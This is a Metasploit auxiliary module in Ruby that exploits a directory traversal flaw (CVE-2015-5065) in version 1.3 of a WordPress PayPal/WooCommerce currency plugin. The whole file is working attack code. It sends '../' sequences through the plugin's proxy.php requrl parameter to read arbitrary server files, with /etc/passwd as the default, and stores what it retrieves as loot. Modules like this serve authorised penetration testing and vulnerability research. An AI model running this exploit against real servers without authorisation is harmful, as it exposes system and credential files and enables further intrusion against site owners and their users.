##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'WordPress PayPal WooCommerce File Read Vulnerability',
      'Description'    => %q{
        This module exploits a directory traversal vulnerability in WordPress Plugin
        "WP PayPal Currency WooCommerce" version 1.3, allowing to read arbitrary files
        with the web server privileges.
      },
      'References'     =>
        [
          ['EDB', '37253'],
          ['WPVDB', '8042'],
          ['CVE', '2015-5065'],
          ['URL', 'https://packetstormsecurity.com/files/132278']
        ],
      'Author'         =>
        [
          'Kuroi SH', # Vulnerability Discovery
          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit Module
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),
        OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 7 ])
      ], self.class)
  end

  def check
    check_plugin_version_from_readme('paypal-currency-converter-basic-for-woocommerce', '1.4')
  end

  def run_host(ip)
    traversal = "../" * datastore['DEPTH']
    filename = datastore['FILEPATH']
    filename = filename[1, filename.length] if filename =~ /^\//

    res = send_request_cgi(
      'method' => 'GET',
      'uri'    => normalize_uri(wordpress_url_plugins, 'paypal-currency-converter-basic-for-woocommerce', 'proxy.php'),
      'vars_get' =>
        {
          'requrl' => "#{traversal}#{filename}"
        }
    )

    if res && res.code == 200 && res.body.length > 0

      vprint_status('Downloading file...')
      vprint_line("\n#{res.body}")

      fname = datastore['FILEPATH']

      path = store_loot(
        'paypal-woocommerce.traversal',
        'text/plain',
        ip,
        res.body,
        fname
      )

      print_good("#{peer} - File saved in: #{path}")
    else
      print_error("#{peer} - Nothing was downloaded. You can try to change the DEPTH parameter.")
    end
  end
end
